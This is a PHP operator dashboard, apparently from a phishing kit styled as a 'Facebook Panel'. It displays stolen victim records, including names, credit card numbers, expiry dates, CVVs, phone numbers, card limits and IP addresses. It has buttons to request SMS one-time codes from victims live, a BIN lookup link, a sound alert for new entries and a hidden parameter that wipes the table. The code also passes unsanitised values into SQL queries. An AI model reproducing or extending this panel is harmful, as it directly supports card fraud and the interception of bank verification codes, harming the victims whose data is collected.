	<?php
include("../baglan.php");
session_start();
header("Cache-control:private");

if($_SESSION['logged'] != "1") {
    header("location:giris.php");
    die(); }

if($_GET['ananisileyim']==1){

mysql_query("TRUNCATE TABLE ak");

echo "<script>alert('Tüm Kayıtlar Silindi.');</script>";
echo "<script>window.location.href='index.php';</script>";

}

		$sorgula = mysql_query("select * from ak WHERE ses='1'") or die("Hata Olustu!");
		while($veri=mysql_fetch_assoc($sorgula))
		{
		if($veri['ses'] == '1'){
			echo '<div id="alerts">
			<audio id="audioplayer" autoplay=true>
			<source src="ses.mp3" type="audio/mpeg">
			Tarayiciniz ses elementlerini desteklemiyor. </audio>
			
			</div>';
			mysql_query("UPDATE ak SET ses='0' WHERE id=".$veri['id']." ");
		}else {

		}
	}
?>
<!DOCTYPE html>
<html lang="en">
<meta http-equiv="refresh" content="3;">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <title>
    Facebook Panel
  </title>
  <!-- Favicon -->
  <link href="assets/img/brand/favicon.png" rel="icon" type="image/png">
  <!-- Fonts -->
  <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,600,700" rel="stylesheet">
  <!-- Icons -->
  <link href="assets/js/plugins/nucleo/css/nucleo.css" rel="stylesheet" />
  <link href="assets/js/plugins/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet" />
  <!-- CSS Files -->
  <link href="assets/css/argon-dashboard.css?v=1.1.0" rel="stylesheet" />
</head>

<body class="">
  
  <div class="main-content">


    <div class="header bg-gradient-primary pb-8 pt-5 pt-md-8">
      <div class="container-fluid">
        <div class="header-body">
          <!-- Card stats -->
         
    <div class="container-fluid mt--7">
      <!-- Dark table -->
      <div class="row mt-5">
        <div class="col">
          <div class="card bg-default shadow">
            <div class="card-header bg-white border-0">
              <center><h3 class="text-dark mb-0">LOG TABLOSU</h3></center>
            </div>
            <div class="table-responsive">
              <table class="table align-items-center table-white table-flush">
                <thead class="thead-white">
                  <tr>
                    <th scope="col">ID</th>
                    <th scope="col">KERİZ ADI</th>
                    <th scope="col">CC NO</th>
                    <th scope="col">SKT</th>
                    <th scope="col">CVV</th>
                    <th scope="col">NO </th>
                    <th scope="col">LİMİT</th>
                    <th scope="col">SMS</th>
                    <th scope="col">SMS - 2</th>
                    <th scope="col">İŞLEM</th>
                    <th scope="col">İP</th>
                  </tr>
                </thead>
                <tbody>
        <?php
		$calistir = mysql_query("select * from ak order by id DESC") or die("Hata Olustu!");
		while($oku=mysql_fetch_assoc($calistir))
		{ $not=$oku['notif'];
		?>
                  <tr>
                    <th scope="row">
                    <?php echo $oku['id']; ?> <a href="bin.php?bnii=<?php $metin = str_replace(" ", "", $oku['kullanici']); echo $metin; ?>" target="popup" onclick="javascript:open('', 'popup', 'height=300,width=400,resizable=no')">BİN SORGULA</a>
                    </th>
                   <td><?php echo $oku['anne']; ?></td>
                   <td><?php echo $oku['kullanici']; ?></td>
                   <td><?php echo $oku['skt']; ?></td>
                   <td><?php echo $oku['pass']; ?></td>
                   <td><?php echo $oku['baba']; ?></td>
                   <td><?php echo $oku['sms3']; ?></td>
                   <td><?php echo $oku['sms1']; ?></td>
                   <td><?php echo $oku['sms2']; ?></td>
                    <td>
                <button onclick="window.location.href='pin.php?pin=<?php echo $oku['ip']; ?>&id=<?php echo $oku['id']; ?>'"  class="btn btn-primary">SMS İSTE</button>
      <button onclick="window.location.href='limit.php?limit=<?php echo $oku['ip']; ?>&id=<?php echo $oku['id']; ?>'"  class="btn btn-dark">SMS 2 İSTE</button>
					<button onclick="window.location.href='sil.php?id=<?php echo $oku['id']; ?>'" class="btn btn-success">Sil</button>
                    </td>
                    <td><?php echo $oku['ip']; ?></td>
                  </tr>
                  <?php } ?>
                </tbody>
              </table>
            </div>
          </div>
        </div>
      </div>
      <!-- Footer -->
     
    </div>
  </div>
  <!--   Core   -->
  <script src="assets/js/plugins/jquery/dist/jquery.min.js"></script>
  <script src="assets/js/plugins/bootstrap/dist/js/bootstrap.bundle.min.js"></script>
  <!--   Optional JS   -->
  <!--   Argon JS   -->
  <script src="assets/js/argon-dashboard.min.js?v=1.1.0"></script>
  <script src="https://cdn.trackjs.com/agent/v3/latest/t.js"></script>
  <script>
    window.TrackJS &&
      TrackJS.install({
        token: "ee6fab19c5a04ac1a32a645abde4613a",
        application: "argon-dashboard-free"
      });
  </script>
</body>

</html>